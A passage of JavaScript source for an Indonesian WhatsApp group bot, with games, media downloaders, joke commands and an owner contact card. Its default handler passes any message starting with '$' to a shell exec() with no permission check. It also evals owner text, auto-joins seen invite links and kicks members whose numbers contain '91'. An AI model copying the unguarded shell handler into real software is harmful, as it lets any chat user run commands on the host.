                const input = args.join(" ")
                const filter1 = await ytsd.getFilters(input)
                const filters1 = filter1.get('Type').get('Video')
                const { items } = await ytsd(filters1.url, { limit: 10 })
                let hehe = `*🔖 YOUTUBE SEARCH*
*🔖 Search Query:* ${input}\n\n`
                for (let i = 0; i < items.length; i++) {
                    hehe += `───────────────\n
*🔖 Judul:* ${items[i].title}
*🔖 Id:* ${items[i].id}
*🔖 Ditonton:* ${items[i].views}
*🔖 Durasi:* ${items[i].duration}
*🔖 Link:* ${items[i].url}\n\n`
                }
                thumb = await getBuffer(items[0].bestThumbnail.url)
                await Bambang.sendMessage(from, thumb, image, {quoted: ftrol, caption: `${hehe}───────────────\n
*🔖 DOWNLOAD*
🔖 ${prefix}ytmp3 [link yt] = Audio
🔖 ${prefix}ytmp4 [link yt] = Video`, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title:`SEARCH: ${args[0]}`,body:"🔖YOUTUBE SEARCH",mediaType:"2",thumbnail:fakethumb,mediaUrl:`https://youtu.be/JN_Gw2GzuqQ`}}})
            } catch(e) {
                reply('Didn\'t find anything or there is any error!')
                reply(`Error: ${e.message}`)
            }
            break
                    case 'pakgirlcek':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})                      	  	
                    N = `KE *PAKGILR* KAMU\n`
                    N += `ADALAH : *${mekla3}${mekla4}%* 😏`
                    reply(N)
                    break             
                    case 'sangecek':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})                      	  
                    N = `JIWA *SANGE* KAMU\n`
                    N += `ADALAH : *${mekla3}${mekla4}%* 🤤`
                    reply(N)
                    break
                    case 'bapercek':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})                      	  
                    N = `JIWA *BEPERAN* KAMU\n`
                    N += `ADALAH : *${mekla3}${mekla4}%* 😘`
                    reply(N)
                    break     


//═════════════════════════ [ GAME MENU ] ═════════════════════════
//═════════════════════════ [ COPAS AJA ] ═════════════════════════
//═════════════════════════ [ NO API ] ═════════════════════════


         case 'gelud':
         //(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
            //   if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
               if (!isGroup) return reply(mess.only.group)
               if (mek.message.extendedTextMessage.contextInfo.mentionedJid > 1) return reply('Hanya bisa dengan 1 orang')
               if (!mek.message.extendedTextMessage.contextInfo.mentionedJid[0]) return
               if (args.length === 0) return reply(`Tag Lawan Yang Ingin Diajak Bermain Game`)
               if (fs.existsSync(`./media/${from}.json`)) return reply(`Sedang Ada Sesi, tidak dapat dijalankan secara bersamaan\nKetik *${prefix}delsesigelud*, untuk menghapus sesi`)
					
               gelutSkuy = setGelud(`${from}`)
               gelutSkuy.status = false
               gelutSkuy.Z = sender.replace("@s.whatsapp.net", "")
               gelutSkuy.Y = args[0].replace("@", "");
               fs.writeFileSync(`./media/${from}.json`, JSON.stringify(gelutSkuy, null, 2))
               starGame = `👑 Memulai Game Baku Hantam 👊🏻

• @${sender.replace("@s.whatsapp.net", "")} Menantang Bergelud
[ ${args[0]} ] Ketik Y/N untuk menerima atau menolak permainan`

               Bambang.sendMessage(from, starGame, text, {quoted: mek, contextInfo: { mentionedJid: [sender, args[0].replace("@", "") + "@s.whatsapp.net"],}})
               gameAdd(sender, glimit)
               break
        case 'delsesigelud':
        //(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})                      	  
               if (!isGroup) return reply(mess.only.group)
               if (fs.existsSync('./media/' + from + '.json')) {
               fs.unlinkSync('./media/' + from + '.json')
               reply('Berhasil Menghapus Sesi Gelud')
               } else {
               reply('Tidak ada sesi yang berlangsung')
}
               break
        case 'delsesittt':
        //(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})                      	  
               if (!isGroup) return reply(mess.only.group)
               if (!isTTT) return reply('Tidak Ada Permainan Di Grub Ini')
               naa = ky_ttt.filter(toek => !toek.id.includes(from)) 
               ky_ttt = naa 
               reply('Sukses Mereset Game')
               break
                case 'cerpen':
                anu = await fetchJson(`https://raku-web.herokuapp.com/api/cerpen?apikey=RakuKeyTod`)
               anu1 = `*JUDUL* : ${anu.result.result.title}\n`
               anu1 += `*PENGARANG* : ${anu.result.result.pengarang}\n`
               anu1 += `*KATEGORI* : ${anu.result .result.kategori}\n` 
               anu1 += `*CERITA* : ${anu.result.result.cerpen}\n`
               reply(anu1)
                break
						case 'play':
if (args.length < 1) return reply('Masukin Judul Lagunya')
teks = args.join(' ')
reply(mess.wait)
if (!teks.endsWith("-doc")){
res = await yts(`${teks}`).catch(e => {
reply('_[ ! ] Error Query Yang Anda Masukan Tidak Ada_')
})
reply(` Playing ${res.all[0].title}`)
let thumbInfo = ` *Youtube Search*
• *Judul :* ${res.all[0].title}
• *ID Video :* ${res.all[0].videoId}
• *Diupload Pada :* ${res.all[0].ago}
• *Views :* ${res.all[0].views}
• *Durasi :* ${res.all[0].timestamp}
• *Channel :* ${res.all[0].author.name}
• *Link Channel :* ${res.all[0].author.url}

*_Tunggu Proses Upload....._*
`
res = await y2mateA(res.all[0].url).catch(e => {
reply('_[ ! ] Error Saat Memasuki Web Y2mate_')
})
sendFileFromUrl(res[0].link, audio, {quoted: mek, mimetype: 'audio/mp4', filename: res[0].output})
}
if (teks.endsWith("-doc")){
var tec = teks.split("-doc")
res = await yts(`${tec}`).catch(e => {
reply('_[ ! ] Error Query Yang Anda Masukan Tidak Ada_')
})
reply(`.Playing ${res.all[0].title}`)
let thumbInfo = `*${botname}* 
• *Judul :* ${res.all[0].title}
• *ID Video :* ${res.all[0].videoId}
• *Diupload Pada :* ${res.all[0].ago}
• *Views :* ${res.all[0].views}
• *Durasi :* ${res.all[0].timestamp}
• *Channel :* ${res.all[0].author.name}
• *Link Channel :* ${res.all[0].author.url}

*_Tunggu Proses Upload....._*
`
sendFileFromUrl(res.all[0].image, image, {quoted: mek, caption: thumbInfo})
res = await y2mateA(res.all[0].url).catch(e => {
reply('_[ ! ] Error Saat Memasuki Web Y2mate_')
})
sendFileFromUrl(res[0].link, document, {quoted: mek, mimetype: 'audio/mp3', filename: res[0].output})
}
break
case 'tinyurl':
           try {
link = args[0]
anu = await axios.get(`https://tinyurl.com/api-create.php?url=${link}`)
reply(`${anu.data}`)
} catch (e) {
emror = String(e)
reply(`${e}`)
}
break
case 'resepmasakan':
              if (args.length < 1) return reply('Judulnya?')
				var teks = body.slice(14)
				anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/resepmakanan?query=${teks}&apikey=${apikey7}`, {method: 'get'})
					hasilresep = `❏ *${anu.results.title}*\n\n❏ Porsi : ${anu.results.servings}\n❏ Waktu : ${anu.results.times}\n❏ Kesulitan : ${anu.results.dificulty}\n❏ Pengguna : ${anu.results.author.user}\n❏ Tanggal Diterbitkan : ${anu.results.author.datePublished}\n❏ Deskripsi : ${anu.results.desc}\n\n────────────────────\n❏ *Tutorial*\n\n❏ Bahan : ${anu.results.ingredient}\n❏ Langkah : ${anu.results.step}`
					reply(mess.wait)
					buff = await getBuffer(anu.results.thumb)
					Bambang.sendMessage(from, buff, image, {quoted: ftrol, caption: hasilresep})
					break 
					case 'artimimpi':
if (args.length < 1) return reply('Teksnya?')
anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/artimimpi?q=${body.slice(11)}&apikey=${apikey7}`, {method: 'get'})
teks = anu.result
reply(teks)
break
               case 'artinama':
               
               if (args.length == 0) return reply(`Example: ${prefix + command} Bambang`)
               anu = await fetchJson(`https://percobaan-apic.herokuapp.com/api/artinama?nama=${args.join(' ')}&apikey=12345`)
               reply(anu.result)
               break
case 'creategrup':
              if (!isGroup) return reply(mess.only.group)
				if (args.length < 1) return reply(`Penggunaan ${prefix}creategrup nama grup|@tag member`)
				argz = arg.split('|')
				if (mek.message.extendedTextMessage != undefined){
                    mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
                    for (let i = 0; i < mentioned.length; i++){
						anu = []
						anu.push(mentioned[i])
                    }
					Bambang.groupCreate(argz[0], anu)
					reply(`Sukses membuat grup ${argz[0]}`)
                }
				break
				case 'sertiff':  
                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} Bambang*`)

                   F = body.slice(10)
                   reply(mess.wait)
                   anu = await getBuffer(`https://percobaan-apic.herokuapp.com/api/sertiff?nama=${F}&apikey=12345`)
                   Bambang.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `Jangan Lupa Subscribe Bambang Official `, quoted: mek})
                   break
case 'attp':
if (args.length == 0) return reply(`Example: ${prefix + command} Hai`)
buffer = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}`)
Bambang.sendMessage(from, buffer, sticker, { quoted: ftrol })
break
case 'ttp':
if (args.length == 0) return reply(`Example: ${prefix + command} Hai`)
buffer = await getBuffer(`https://percobaan-apic.herokuapp.com/api/others/ttp?apikey=12345&text=${encodeURI(q)}`)
Bambang.sendMessage(from, buffer, sticker, { quoted: mek })
break

case 'sertiff2':  
     case 'sertiff3':
                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} Bambang*`)
                   F = body.slice(11)
                   reply(mess.wait)
                   anu = await getBuffer(`https://percobaan-apic.herokuapp.com/api/${command}?nama=${F}&apikey=${bambangkey}`)
                   Bambang.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nHow is it? `, quoted: mek})
                   break
case 'twmp4': case 'twitter':
		if (args.length < 1) return reply('Link?')
lin = args[0]
sticWait(from)
hx.twitter(lin).then(res => {
console.log('[ TWITTER ] downloader')
Anu = res.SD
fto = fakethumb
sendMediaURL(from, Anu, 'Done!')
})
break
case 'infogempa':
              anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/info/gempa?apikey=${apikey7}`, {method: 'get'})

					gempa = `❏ *INFO GEMPA*\n\n❏ Waktu : ${anu.result.Waktu}\n❏ Lintang : ${anu.result.Lintang}\n❏ Bujur : ${anu.result.Bujur}\n❏ Magnitudo : ${anu.result.Magnitudo}\n❏ Kedalaman : ${anu.result.Kedalaman}\n❏ Wilayah : ${anu.result.Wilayah}`
					reply(mess.wait)
					buff = await getBuffer(anu.result.Map)
					Bambang.sendMessage(from, buff, image, {quoted: ftrol, caption: gempa})
					break
case 'owner2':
let inilist = []
for (let i of ownerNumber) {
let vname = Bambang.contacts[i] != undefined ? Bambang.contacts[i].vname || Bambang.contacts[i].notify : undefined
inilist.push({
"displayName": 'BTR X-BOT OFC',
"vcard": 'BEGIN:VCARD\n'
+ 'VERSION:3.0\n'
+ `FN:${NameOwner}\n`
+ `ORG: Creator ${NameOwner} ;\n`
+ `TEL;type=CELL;type=VOICE;waid=${NomorOwner}:${NomorOwner}\n`
+ 'END:VCARD'.trim()
})
}
hehe = await Bambang.sendMessage(from, {
"displayName": `${inilist.length} kontak`,
"contacts": inilist 
}, 'contactsArrayMessage', { quoted: ftrol })
button = [
{buttonId: 'youtube', buttonText: {displayText: 'YOUTUBE'}, type: 1},
{buttonId: 'instagram', buttonText: {displayText: 'INSTAGRAM'}, type: 1},
{buttonId: 'tiktok', buttonText: {displayText: 'TIKTOK'}, type: 1}
]
 buttons = {
contentText: 'Nih Nomer Owner Ku Mau Tau Tentang Apa Ya ?',
footerText: faketeks,
buttons: button,
headerType: 1
}
await Bambang.sendMessage(from, buttons, MessageType.buttonsMessage, {quoted: ftrol})
break      
case 'report':
let pesan = body.slice(8)
if (pesan.length > 300) return pras.sendMessage(from, 'Maaf Teks Terlalu Panjang, Maksimal 300 Teks', text, { quoted: ftrol })
var nomor = mek.participant
let teks1 = `[𝗥𝗘𝗣𝗢𝗥𝗧]\n𝐏𝐞𝐬𝐚𝐧 : ${pesan}`
var options = {
text: teks1,
contextInfo: { mentionedJid: [nomor] },
}
Bambang.sendMessage(`6282313021398@s.whatsapp.net`, options, text, { quoted: ftrol })
reply('Masalah Telah Di Laporkan Ke Owner BOT, Mohon Tunggu Untuk Proses Perbaikan')
break
case 'youtube':
teks =
`Nih Youtube Owner Ku Jangan Lupa Di Subscribe Ya https://youtube.com/Bambangofficial`
Bambang.sendMessage(from, teks, text, {quoted: ftrol})
break
case 'snk':
case 'rules':
rules = `*「 PERATURAN BOT 」*

1. DILARANG TELFON BOT!!
2. DILARANG SPAM BOT
3. DILARANG BERKATA KASAR
4. DILARANG SPAM VIRTEX
5. DILARANG TELEFON OWNER
6. DILARANG SPAM GROUP
7. DILARANG SPAM ADMIN
8. DILARANG BERKATA KASAR DI GC

⚠️JIKA KALIAN MELANGGAR.. AKAN DI BLOCK + BANNED!!`
var ZeroYT7 = {
            contextInfo: {
            participant: '0@s.whatsapp.net',
            remoteJid: 'status@broadcast',
            isForwarded: true,
            forwardingScore: 8,
           quotedMessage: {
           imageMessage: {
           caption: `©CREATED BY BAMBANG TRI RAHARJO`,
           jpegThumbnail: fakethumb,
           mimetype: 'image/jpeg',
           }
           }
           }
           } 
           Bambang.sendMessage(from, rules, MessageType.text, ZeroYT7)
           break
case 'instagram':
teks =
`Nih Instagram Owner Ku Jangan Lupa Di Follow Ya https://instagram.com/btr_three`
Bambang.sendMessage(from, teks, text, {quoted: ftrol})
break
case 'tiktok':
teks =
`Nih Tiktok Owner Ku Jangan Lupa Di Follow Ya https://tiktok.com/@sadboy.edtz`
Bambang.sendMessage(from, teks, text, {quoted: ftrol})
break
case 'sourcecode':
case 'script':
case 'sc':
teks = `Script?? Beli Donk Asw Dobol Kunyuk Pantexx`
Bambang.sendMessage(from, teks, text, {quoted : mek})
break
case "runtime":
case "test":
run = process.uptime();
teks = `${kyun(run)}`;
reply(teks);
break
case 'speed':
case 'ping':
reply(`Speed: ${latensyi.toFixed(4)} Second`)
break
case 'twmp3':
		if (args.length < 1) return reply('Link?')
lin = args[0]
sticWait(from)
hx.twitter(lin).then(async (res) => {
console.log('[ TWITTER ] downloader')
Anu = res.SD
khs = await getBuffer(Anu)
Bambang.sendMessage(from, khs, audio, {mimetype:'audio/mp4', filename:'audio.mp3', quoted:ftrol, ptt:true})
})
break
        case 'tictactoe':
        case 'ttt':
        //(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})                      	  
         //     if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
              if (!isGroup) return reply(mess.only.group)
              if (args.length < 1) return reply('Tag Lawan Anda! ')
              if (isTTT) return reply('Sedang Ada Permainan Di Grub Ini, Harap Tunggu')
              if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target Lawan!')
              ment = mek.message.extendedTextMessage.contextInfo.mentionedJid
              player1 = sender
              player2 = ment[0]
              angka = ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]
              id = from
              gilir = player2
              ky_ttt.push({player1,player2,id,angka,gilir})
              Bambang.sendMessage(from, 
`*🎳 Memulai Game Tictactoe 🎲*

[@${player2.split('@')[0]}] Menantang anda untuk menjadi lawan Game🔥
Ketik Y/N untuk menerima atau menolak permainan

Ket : Ketik /resetgame , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {contextInfo: {mentionedJid: [player2]}})
              gameAdd(sender, glimit)
              break 
              
//═════════════════════════ [ END ALL FITUR ] ═════════════════════════
//═════════════════════════ [ WHATSAPP BOT By Bambang ] ═════════════════════════
//═════════════════════════ [ COPAS? SILAHKAN 🗿👍 ] ═════════════════════════

//Tes New
case 'tes':
case 'test':
 //(!isRegistered) return sendButMessage(from, daftar1, daftar2, daftar3, { quoted: mek})
reply('On')
break
case 'createcatalog':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})                      	  
if (args.length === 0) return reply(`Example : ${prefix + command} Nama Catalog|Isi Catalog|Nomor Pembuat Catalog\n*Awali Nomor Dengan 62*`)
var nnn = body.slice(15)
var namanye = nnn.split("|")[0]
var isinye = nnn.split("|")[1]
var nomernye = nnn.split("|")[2]
namae = `${namanye}`
ownereJid = `${nomernye}@s.whatsapp.net`
nomor = 1
stod = `${sender}`
stst = await Bambang.getStatus(`${sender.split('@')[0]}@c.us`)
stst = stst.status == 401 ? '' : stst.status
menunye = `${isinye}`
anu = Bambang.prepareMessageFromContent(from,{"productMessage": {"product": {"productImage": {"url": "https://mmg.whatsapp.net/d/f/Au9n7y-3XR4R0WUNdcQNNM2_mMcYLdVQQP9NkcG2sI-D.enc","mimetype": "image/jpeg","fileSha256": "ebKk5FKDC/fSbQKa4bmQ+EHbDZ/rqi78a+eYm4Z3TfQ=","fileLength": "20040","height": 390,"width": 390,"mediaKey": "+k8is4MAgrumDtQJQYfXtfN/haBmhmr4j4OKpM0Vl04=","fileEncSha256": "yu+xoTWjIR6UHVqdGNPINUyn6s50B+wDeZorjX1DP14=","jpegThumbnail": fs.readFileSync("./media/buat.jpg")},"productId": "9999999","title": `${namae}`, "description": `${menunye}`,"productImageCount": 1},"businessOwnerJid": `${ownereJid}`,"contextInfo": {"forwardingScore": 9999,"isForwarded": true}}},{quoted: mek, contextInfo: { mentionedJid: [stod]}})
Bambang.relayWAMessage(anu)
break
case 'catalog': 
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})                      	  
nama = 'Tes Catalog'
ownerJid = `${NOwner}`
nomor = 1
stod = `${sender}`
stst = await Bambang.getStatus(`${sender.split('@')[0]}@c.us`)
stst = stst.status == 401 ? '' : stst.status
menunya = `Ngetes Uyy`
anu = Bambang.prepareMessageFromContent(from,{"productMessage": {"product": {"productImage": {"url": "https://mmg.whatsapp.net/d/f/Au9n7y-3XR4R0WUNdcQNNM2_mMcYLdVQQP9NkcG2sI-D.enc","mimetype": "image/jpeg","fileSha256": "ebKk5FKDC/fSbQKa4bmQ+EHbDZ/rqi78a+eYm4Z3TfQ=","fileLength": "20040","height": 390,"width": 390,"mediaKey": "+k8is4MAgrumDtQJQYfXtfN/haBmhmr4j4OKpM0Vl04=","fileEncSha256": "yu+xoTWjIR6UHVqdGNPINUyn6s50B+wDeZorjX1DP14=","jpegThumbnail": fs.readFileSync("./media/price.jpg")},"productId": "9999999","title": `${nama}`, "description": `${menunya}`,"productImageCount": 1},"businessOwnerJid": `${ownerJid}`,"contextInfo": {"forwardingScore": 9999,"isForwarded": true}}},{quoted: mek, contextInfo: { mentionedJid: [stod]}})
Bambang.relayWAMessage(anu)
break
default:
var sotoy = [

        '🍊 : 🍒 : 🍐',
        '🍒 : 🔔 : 🍊',
        '🍇 : 🍇 : 🍐',
        '🍊 : 🍋 : 🔔', //ANKER
        '🔔 : 🍒 : 🍐',
        '🔔 : 🍒 : 🍊',
        '🍊 : 🍋 : 🔔',        
        '🍐 : 🍒 : 🍋',
        '🍐 : 🍒 : 🍐',
        '🍊 : 🍒 : 🍒',
        '🔔 : 🔔 : 🍇',
        '🍌 : 🍌 : 🔔',
        '🍐 : 🔔 : 🔔',
        '🍊 : 🍋 : 🍒',
        '🍋 : 🍋 : 🍋 Win👑',
        '🔔 : 🔔 : 🍇',
        '🔔 : 🍇 : 🍇', 
        '🔔 : 🍐 : 🔔',
        '🍌 : 🍌 : 🍌 Win👑'
        ]

if (isGroup && autojoin == true) {
      if (budy.includes("://chat.whatsapp.com/")) {
        console.log(
          color("[AUTO-JOIN]", "red"),
          color("YAHAHAHHAHAH", "white")
        );
        Bambang.query({
          json: [
            "action",
            "invite",
            `${budy.replace("https://chat.whatsapp.com/", "")}`,
          ],
        });
      }
    }
    if (isGroup && isKickarea && !mek.key.fromMe) {
      if (sender.includes("91")) {
        reply("GRUP ONLY +91!");
        Bambang.groupRemove(from, [sender]);
      }
    }
    //auto voice note by Bambang
    for (let anju of vien){
				if (budy === anju){
					result = fs.readFileSync(`./media/vn/${anju}.mp3`)
					Bambang.sendMessage(from, result, audio, { mimetype: 'audio/mp4', ptt: true, quoted: mek})
					}
			}
			//auto sticker
			for (let anji of setik){
				if (budy === anji){
					result = fs.readFileSync(`./media/sticker/${anji}.webp`)
					Bambang.sendMessage(from, result, sticker, { quoted: mek})
					}
			}
			//auto image
			for (let anjh of imagi){
				if (budy === anjh){
					result = fs.readFileSync(`./media/image/${anjh}.jpg`)
					Bambang.sendMessage(from, result, image, { quoted: mek})
					}
			}
			// auto text 
			for (var i = 0; i < commandsDB.length ; i++) {
				if (budy.toLowerCase() === commandsDB[i].pesan) {
					reply(commandsDB[i].balasan)
				}
			}
			// $cat
			    if (budy.startsWith('$')){
      const cod = args.join(' ')
      exec(cod, (err, stdout) => {
      if(err) return reply(`${err}`)
      if (stdout) {
      reply(`${stdout}`)
      }
      })
    }
    // whatsapp profie o status san\\
    let settingstatus = 0;
    if (new Date() * 1 - settingstatus > 1000) {
      let _uptime = process.uptime() * 1000;
      let uptime = clockString(_uptime);

await Bambang.setStatus(`Bot Mode On Since ${uptime}`).catch((_) => _);
      settingstatus = new Date() * 1;
    }

if (fs.existsSync(`./media/${from}.json`)) {
	gelutSkuy = setGelud(`${from}`)
	if (sender == `${gelutSkuy.Y}@s.whatsapp.net` && budy.toLowerCase() == 'y') {
		if (gelutSkuy.status) return reply(`Game telah dimulai sebelumnya!`)
		gelutSkuy.status = true
		rand0m = [ gelutSkuy.Z, gelutSkuy.Y ]
		winR = rand0m[Math.floor(Math.random() * rand0m.length)]
		fs.writeFileSync(`./media/${from}.json`, JSON.stringify(gelutSkuy, null, 2))
		starGame = `👑 Gelud Game 🤙🏻 

Diantara @${gelutSkuy.Z} & @${gelutSkuy.Y}
• Pemenangnya adalah [ @${winR} ] `
	   Bambang.sendMessage(from, starGame, text, {quoted: troli, contextInfo: { mentionedJid: [winR + "@s.whatsapp.net", gelutSkuy.Z + "@s.whatsapp.net", gelutSkuy.Y + "@s.whatsapp.net",]}})
		fs.unlinkSync("./media/" + from + ".json");
	} else if (sender == `${gelutSkuy.Y}@s.whatsapp.net` &&  budy.toLowerCase() == 'n') {
		Bambang.sendMessage(from, `👑 Game Gelud Rejected 🤙🏻
• @${gelutSkuy.Y} Menolak🤙🏻`, text, {quoted: troli, contextInfo: { mentionedJid: [gelutSkuy.Y + "@s.whatsapp.net"]}})
		fs.unlinkSync("./media/" + from + ".json");
	}
}

if (isTTT && isPlayer2){
if (budy.startsWith('Y')){
  tto = ky_ttt.filter(ghg => ghg.id.includes(from))
  tty = tto[0]
  angka = tto[0].angka
  ucapan = 
`*🎳 Game Tictactoe 🎲*

Player1 @${tty.player1.split('@')[0]}=❎
Player2 @${tty.player2.split('@')[0]}=⭕

Giliran = @${tty.player1.split('@')[0]}

   ${angka[1]}${angka[2]}${angka[3]}
   ${angka[4]}${angka[5]}${angka[6]}
   ${angka[7]}${angka[8]}${angka[9]}`
  Bambang.sendMessage(from, ucapan, text, {quoted: troli, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
  }
if (budy.startsWith('N')){
tto = ky_ttt.filter(ghg => ghg.id.includes(from))
tty = tto[0]
naa = ky_ttt.filter(toek => !toek.id.includes(from)) 
ky_ttt = naa
Bambang.sendMessage(from, `Yahh @${tty.player2.split('@')[0]} Menolak:(`,text,{quoted:troli,contextInfo:{mentionedJid:[tty.player2]}})
}
}

if (isTTT && isPlayer1){
nuber = parseInt(budy)
if (isNaN(nuber)) return
if (nuber < 1 || nuber > 9) return reply('Masukan Angka Dengan Benar')
main = ky_ttt.filter(hjh => hjh.id.includes(from)) 
if (!tttawal.includes(main[0].angka[nuber])) return reply('Udah Di Isi, Isi Yang Lain Gan')
if (main[0].gilir.includes(sender)) return reply('Tunggu Giliran Gan')
s = '❎'
main[0].angka[nuber] = s
main[0].gilir = main[0].player1
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
ky_ttt = naa
pop = main[0]
ky_ttt.push(pop)
tto = ky_ttt.filter(hgh => hgh.id.includes(from))
tty = tto[0]
angka = tto[0].angka
ttt = `${angka[1]}${angka[2]}${angka[3]}\n${angka[4]}${angka[5]}${angka[6]}\n${angka[7]}${angka[8]}${angka[9]}`

ucapmenang = () => {
ucapan1 = 
`*🎳Result Game Tictactoe 🎲*

*Yeyyy Permainan Di Menangkan Oleh* @${tty.player1.split('@')[0]}\n
*Ingin bermain lagi? ${prefix}tictactoe*`
ucapan2 = `*🎳Result Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
Bambang.sendMessage(from, ucapan1, text, {quoted: troli, contextInfo:{mentionedJid: [tty.player1]}})
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}

if (angka[1] == s && angka[2] == s && angka[3] == s) return ucapmenang()

if (angka[1] == s && angka[4] == s && angka[7] == s) return ucapmenang()

if (angka[1] == s && angka[5] == s && angka[9] == s) return ucapmenang()

if (angka[2] == s && angka[5] == s && angka[8] == s) return ucapmenang()

if (angka[4] == s && angka[5] == s && angka[6] == s) return ucapmenang()

if (angka[7] == s && angka[8] == s && angka[9] == s) return ucapmenang()

if (angka[3] == s && angka[5] == s && angka[7] == s) return ucapmenang()

if (angka[3] == s && angka[6] == s && angka[9] == s) return ucapmenang()

if (!ttt.includes('1️⃣') && !ttt.includes('2️⃣') && !ttt.includes('3️⃣') && ! ttt.includes('4️⃣') && !
ttt.includes('5️⃣') && !
ttt.includes('6️⃣') && ! ttt.includes('7️⃣') && ! ttt.includes('8️⃣') && ! ttt.includes('9️⃣')){
ucapan1 = `*🎳 Result Game Tictactoe 🎲*

*_Permainan Seri ??👌_*`
ucapan2 = `*🎳 Result Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
reply(ucapan1)
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}
ucapan = `*🎳 Game Tictactoe 🎲*

Player2 @${tty.player2.split('@')[0]}=⭕
Player1 @${tty.player1.split('@')[0]}=❎

Giliran = @${tty.player2.split('@')[0]}

${ttt}`
Bambang.sendMessage(from, ucapan, text, {quoted: troli, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
}
if (isTTT && isPlayer2){
nuber = parseInt(budy)
if (isNaN(nuber)) return
if (nuber < 1 || nuber > 9) return reply('Masukan Angka Dengan Benar')
main = ky_ttt.filter(hjh => hjh.id.includes(from)) 
if (!tttawal.includes(main[0].angka[nuber])) return reply('Udah Di Isi, Isi Yang Lain Gan')
if (main[0].gilir.includes(sender)) return reply('Tunggu Giliran Gan')
s = '⭕'
main[0].angka[nuber] = s
main[0].gilir = main[0].player2
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
ky_ttt = naa
pop = main[0]
ky_ttt.push(pop)
tto = ky_ttt.filter(hgh => hgh.id.includes(from))
tty = tto[0]
angka = tto[0].angka
ttt = `${angka[1]}${angka[2]}${angka[3]}\n${angka[4]}${angka[5]}${angka[6]}\n${angka[7]}${angka[8]}${angka[9]}`

ucapmenang = () => {
ucapan1 = `*🎳 Result Game Tictactoe 🎲*

*Yeyyy Permainan Di Menangkan Oleh* @${tty.player2.split('@')[0]}\n
*Ingin bermain lagi? ${prefix}tictactoe*`
ucapan2 = `*🎳 Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
Bambang.sendMessage(from, ucapan1, text, {quoted:troli, contextInfo:{mentionedJid: [tty.player2]}})
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}

if (angka[1] == s && angka[2] == s && angka[3] == s) return ucapmenang()
if (angka[1] == s && angka[4] == s && angka[7] == s) return ucapmenang()
if (angka[1] == s && angka[5] == s && angka[9] == s) return ucapmenang()
if (angka[2] == s && angka[5] == s && angka[8] == s) return ucapmenang()
if (angka[4] == s && angka[5] == s && angka[6] == s) return ucapmenang()
if (angka[7] == s && angka[8] == s && angka[9] == s) return ucapmenang()
if (angka[3] == s && angka[5] == s && angka[7] == s) return ucapmenang()
if (angka[3] == s && angka[6] == s && angka[9] == s) return ucapmenang()
if (!ttt.includes('1️⃣') && !ttt.includes('2️⃣') && !ttt.includes('3️⃣') && ! ttt.includes('4️⃣') && !
ttt.includes('5️⃣') && !
ttt.includes('6️⃣') && ! ttt.includes('7️⃣') && ! ttt.includes('8️⃣') && ! ttt.includes('9️⃣')){
ucapan1 = `*🎳Result Game Tictactoe 🎲*

*_Permainan Seri🗿👌*`
ucapan2 = `*🎳 Result Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
reply(ucapan1)
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}
ucapan = `*🎳 Game Tictactoe 🎲*

Player1 @${tty.player1.split('@')[0]}=⭕
Player2 @${tty.player2.split('@')[0]}=❎
   
Giliran = @${tty.player1.split('@')[0]}

${ttt}`
 Bambang.sendMessage(from, ucapan, text, {quoted: troli, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
} else {
}
if (budy.startsWith('>')){
if (!mek.key.fromMe && !isOwner) return
try {
return Bambang.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: mek})
} catch(err) {
e = String(err)
reply(e)
}
}
if (isMuted){
            if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return
            if (budy.toLowerCase().startsWith(`${prefix}unmute`)){
                let anu = mute.indexOf(from)
                mute.splice(anu, 1)
                fs.writeFileSync('./storage/mute.json', JSON.stringify(mute))
                reply('Bot telah diunmute di group ini')
            }
        }
if (!isOwner) return
if (budy.startsWith('+')) {
try {
console.log(color('[ EVAL ]', 'pink'), color(time), budy, color('dari', 'yellow'), pushname, color('di'), isGroup ? groupName : 'Private Chat')
reply(require('util').format(eval(`;(async () => { ${budy.slice(2)} })()`)))
} catch(e) {
console.log(e)
err = String(e)
js = JSON.stringify(e, null, 2)
